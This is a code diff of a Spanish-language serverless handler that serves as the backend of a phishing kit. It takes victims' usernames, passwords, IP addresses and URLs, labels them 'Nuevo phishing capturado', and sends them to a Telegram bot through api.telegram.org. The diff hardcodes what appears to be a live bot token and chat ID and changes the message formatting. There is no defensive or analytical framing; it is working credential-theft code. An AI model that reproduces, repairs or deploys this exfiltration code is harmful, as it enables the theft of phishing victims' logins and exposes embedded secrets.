@@ -1,5 +1,4 @@
 export default async function handler(req, res) {
-  // Permitir solo POST
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -10,18 +9,12 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Faltan datos' });
   }
 
-  const BOT_TOKEN = process.env.BOT_TOKEN || '8362088773:AAHzeHvckVgQdFAIHeZ5h1Sp21uMWVyEvrY';
-  const CHAT_ID = process.env.CHAT_ID || '6585263119';
-
+  const BOT_TOKEN = '8362088773:AAHzeHvckVgQdFAIHeZ5h1Sp21uMWVyEvrY';
+  const CHAT_ID = '6585263119';
+  
   const fecha = new Date().toLocaleString('es-AR');
-
-  const mensaje = `🎣 *Nuevo phishing capturado*
-
-👤 *Usuario:* `${usuario}`
-🔑 *Contraseña:* `${contrasena}`
-📅 *Fecha:* ${fecha}
-🌐 *IP:* ${ip || 'No disponible'}
-🔗 *URL:* ${url || 'No disponible'}`;
+  
+  const mensaje = `🎣 Nuevo phishing capturado\n\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📅 Fecha: ${fecha}\n🌐 IP: ${ip || 'No disponible'}\n🔗 URL: ${url || 'No disponible'}`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -30,7 +23,7 @@ export default async function handler(req, res) {
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: mensaje,
-        parse_mode: 'MarkdownV2'
+        parse_mode: 'HTML'
       })
     });
 
